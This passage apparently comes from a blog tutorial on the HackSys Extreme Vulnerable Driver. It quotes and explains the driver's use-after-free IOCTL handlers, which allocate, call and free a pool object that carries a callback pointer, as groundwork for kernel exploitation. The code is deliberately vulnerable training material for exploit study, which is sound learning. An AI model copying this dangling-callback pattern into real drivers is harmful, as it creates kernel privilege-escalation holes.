+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">106</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x819</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">107</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x81A</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">108</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x81B</span>)
+</span></span></code></pre></div><p>However, for this tutorial we&rsquo;d only be focusing on the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">85</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x804</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">86</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x805</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">87</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x806</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span> <span style="color:#960050;background-color:#1e0010">#</span>define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x807</span>)
+</span></span></code></pre></div><h2 id="understanding-allocateuafobjectnonpagedpoolioctlhandler">Understanding AllocateUaFObjectNonPagedPoolIoctlHandler</h2>
+<p>We can find this function within <code>UseAfterFreeNonPagedPool.c</code> on line 357.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">357</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">358</span> <span style="color:#a6e22e">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">359</span>     _In_ PIRP Irp,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">360</span>     _In_ PIO_STACK_LOCATION IrpSp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">361</span> )
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">362</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">363</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">364</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">365</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(Irp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">366</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(IrpSp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">367</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">368</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">369</span>     Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">AllocateUaFObjectNonPagedPool</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">370</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">371</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">372</span> }
+</span></span></code></pre></div><p>This function ultimately calls <code>AllocateUaFObjectNonPagedPool</code>, which starts on line 86.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">86</span> NTSTATUS
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">87</span> <span style="color:#a6e22e">AllocateUaFObjectNonPagedPool</span>(
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span>     VOID
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">89</span> )
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">90</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">91</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">92</span>     PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">93</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">94</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">95</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">96</span>     <span style="color:#66d9ef">__try</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">97</span>     {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">98</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Allocating UaF Object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">99</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">101</span>         <span style="color:#75715e">// Allocate Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">102</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">103</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">104</span>         UseAfterFree <span style="color:#f92672">=</span> (PUSE_AFTER_FREE_NON_PAGED_POOL)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">105</span>             NonPagedPool,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">106</span>             <span style="color:#66d9ef">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">107</span>             (ULONG)POOL_TAG
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">108</span>         );
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">109</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">110</span>         <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>UseAfterFree)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">111</span>         {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">112</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">113</span>             <span style="color:#75715e">// Unable to allocate Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">114</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">115</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">116</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Unable to allocate Pool chunk</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">117</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">118</span>             Status <span style="color:#f92672">=</span> STATUS_NO_MEMORY;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">119</span>             <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">120</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">121</span>         <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">122</span>         {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">123</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Tag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(POOL_TAG));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">124</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Type: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(NonPagedPool));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">126</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, UseAfterFree);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">127</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">128</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">129</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">130</span>         <span style="color:#75715e">// Fill the buffer with ASCII &#39;A&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">131</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">132</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">133</span>         <span style="color:#a6e22e">RtlFillMemory</span>((PVOID)UseAfterFree<span style="color:#f92672">-&gt;</span>Buffer, <span style="color:#66d9ef">sizeof</span>(UseAfterFree<span style="color:#f92672">-&gt;</span>Buffer), <span style="color:#ae81ff">0x41</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">134</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">135</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">136</span>         <span style="color:#75715e">// Null terminate the char buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">137</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">138</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span>         UseAfterFree<span style="color:#f92672">-&gt;</span>Buffer[<span style="color:#66d9ef">sizeof</span>(UseAfterFree<span style="color:#f92672">-&gt;</span>Buffer) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">140</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">141</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">142</span>         <span style="color:#75715e">// Set the object Callback function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">143</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">144</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">145</span>         UseAfterFree<span style="color:#f92672">-&gt;</span>Callback <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>UaFObjectCallbackNonPagedPool;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">146</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">147</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">148</span>         <span style="color:#75715e">// Assign the address of UseAfterFree to a global variable
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">149</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">150</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">151</span>         g_UseAfterFreeObjectNonPagedPool <span style="color:#f92672">=</span> UseAfterFree;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">152</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">153</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UseAfterFree Object: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, UseAfterFree);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">154</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, g_UseAfterFreeObjectNonPagedPool);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UseAfterFree-&gt;Callback: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, UseAfterFree<span style="color:#f92672">-&gt;</span>Callback);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">156</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">157</span>     <span style="color:#66d9ef">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">158</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">159</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetExceptionCode</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">160</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Exception Code: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">161</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">162</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">163</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">164</span> }
+</span></span></code></pre></div><p>Let&rsquo;s break down what this function is doing at a high-level.</p>
+<ul>
+<li>Lines <strong>91-92</strong> we see variables being declared, one of them being a custom structure containing two members: a <code>function pointer</code>, and a <code>char buffer[0x54]</code>.</li>
+<li>On line <strong>94</strong> we see the PAGED_CODE macro defined. This macro marks this function as pageable. What this means is, if the function is not present in memory it may be moved to disk. The OS will do this if it needs physical memory for other tasks.</li>
+<li>Lines <strong>104-108</strong> we see a call to ExAllocatePoolWithTag() this is a Windows API call. Basically, what this does is allocate &ldquo;pool memory&rdquo; of a specified type and will return a pointer to the allocated block, which as we can see is then casted.
+<ul>
+<li><strong>Argument 1</strong>: Here we use a Nonpaged pool, which can be accessed from any IRQL, notably memory allocated with this type is <code>EXECUTABLE</code>.</li>
+<li><strong>Argument 2</strong>: Size of the chunk.</li>
+<li><strong>Argument 3</strong>: A pool tag, which from my understanding is for debugging purposes. We can find this in common.h as Hack or &ldquo;kcaH&rdquo; since it must be specified in reverse order.</li>
+</ul>
+</li>
+<li>Lines <strong>110-127</strong> we can ignore as it&rsquo;s just error/success checking the last call</li>
+<li>On line <strong>133</strong> we basically see a call to <code>RtlFillMemory()</code> another Windows API (memset in nix).</li>
+<li>On line <strong>139</strong> we NULL terminate the buffer we filled with A&rsquo;s.</li>
+<li>On line <strong>145</strong> we set the function pointer to the <code>UaFObjectCallbackNonPagedPool</code> function.</li>
+<li>On line <strong>151</strong> we assign the address of the allocated object to a global variable.</li>
+</ul>
+<p>Pretty straight forward! We&rsquo;re just allocating some memory (marked executable) to hold the <code>PUSE_AFTER_FREE_NON_PAGED_POOL</code> structure, fill the <code>Buffer</code> member (char array), and set the Callback member (function pointer). The structure definition can be seen below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">62</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USE_AFTER_FREE_NON_PAGED_POOL
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">63</span> {   
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">64</span>     FunctionPointer Callback;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">65</span>     CHAR Buffer[<span style="color:#ae81ff">0x54</span>];
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">66</span> } USE_AFTER_FREE_NON_PAGED_POOL, <span style="color:#f92672">*</span>PUSE_AFTER_FREE_NON_PAGED_POOL;
+</span></span></code></pre></div><h2 id="understanding-useuafobjectnonpagedpoolioctlhandler">Understanding UseUaFObjectNonPagedPoolIoctlHandler</h2>
+<p>Once again, this as a &ldquo;wrapper&rdquo; to call another function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">375</span> <span style="color:#75715e">/// &lt;summary&gt;                                                             
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">376</span> <span style="color:#75715e">/// Use UaF Object NonPagedPool Ioctl Handler                             
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">377</span> <span style="color:#75715e">/// &lt;/summary&gt;                                                            
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">378</span> <span style="color:#75715e">/// &lt;param name=&#34;Irp&#34;&gt;The pointer to IRP&lt;/param&gt;                          
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">379</span> <span style="color:#75715e">/// &lt;param name=&#34;IrpSp&#34;&gt;The pointer to IO_STACK_LOCATION structure&lt;/param&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">380</span> <span style="color:#75715e">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;                                           
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">381</span> NTSTATUS                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">382</span> <span style="color:#a6e22e">UseUaFObjectNonPagedPoolIoctlHandler</span>(                                     
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">383</span>     _In_ PIRP Irp,                                                        
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">384</span>     _In_ PIO_STACK_LOCATION IrpSp                                         
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">385</span> )                                                                         
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">386</span> {                                                                         
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">387</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;                                
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">388</span>                                                                           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">389</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(Irp);                                          
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">390</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(IrpSp);                                        
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">391</span>     <span style="color:#a6e22e">PAGED_CODE</span>();                                                         
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">392</span>                                                                           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">393</span>     Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">UseUaFObjectNonPagedPool</span>();                                  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">394</span>                                                                           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">395</span>     <span style="color:#66d9ef">return</span> Status;                                                        
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">396</span> } 
+</span></span></code></pre></div><p>Let&rsquo;s look at <code>UseUaFObjectNonPagedPool()</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">171</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">172</span> <span style="color:#a6e22e">UseUaFObjectNonPagedPool</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">173</span>     VOID
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">174</span> )
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">175</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">176</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">177</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">178</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">179</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">180</span>     <span style="color:#66d9ef">__try</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">181</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">182</span>         <span style="color:#66d9ef">if</span> (g_UseAfterFreeObjectNonPagedPool)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">183</span>         {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">184</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Using UaF Object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">185</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, g_UseAfterFreeObjectNonPagedPool);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">186</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, g_UseAfterFreeObjectNonPagedPool<span style="color:#f92672">-&gt;</span>Callback);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">187</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Calling Callback</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">188</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">189</span>             <span style="color:#66d9ef">if</span> (g_UseAfterFreeObjectNonPagedPool<span style="color:#f92672">-&gt;</span>Callback)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">190</span>             {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">191</span>                 g_UseAfterFreeObjectNonPagedPool<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Callback</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">192</span>             }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">193</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">194</span>             Status <span style="color:#f92672">=</span> STATUS_SUCCESS;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">195</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">196</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">197</span>     <span style="color:#66d9ef">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">198</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">199</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetExceptionCode</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Exception Code: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">201</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">202</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">203</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span> }
+</span></span></code></pre></div><p>Ok, so pretty straightforward. We&rsquo;re simply calling the <code>Callback</code> function pointer, which we previously saw was set in the <code>AllocateUaFObjectNonPagedPoolIoctlHandler()</code> to <code>UaFObjectCallbackNonPagedPool</code>.</p>
+<h2 id="understanding-freeuafobjectnonpagedpoolioctlhandler">Understanding FreeUaFObjectNonPagedPoolIoctlHandler</h2>
+<p>Once again we see that this handler takes no arguments.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">405</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">406</span> <span style="color:#a6e22e">FreeUaFObjectNonPagedPoolIoctlHandler</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">407</span>     _In_ PIRP Irp,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">408</span>     _In_ PIO_STACK_LOCATION IrpSp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">409</span> )   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">410</span> {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">411</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">412</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">413</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(Irp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">414</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(IrpSp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">415</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">416</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">417</span>     Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">FreeUaFObjectNonPagedPool</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">418</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">419</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">420</span> }
+</span></span></code></pre></div><p>Lets look at <code>FreeUaFObjectNonPagedPool</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">211</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">212</span> <span style="color:#a6e22e">FreeUaFObjectNonPagedPool</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">213</span>     VOID
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">214</span> )   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">215</span> {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">216</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">217</span>     
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">218</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">219</span>     
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span>     <span style="color:#66d9ef">__try</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span>     {
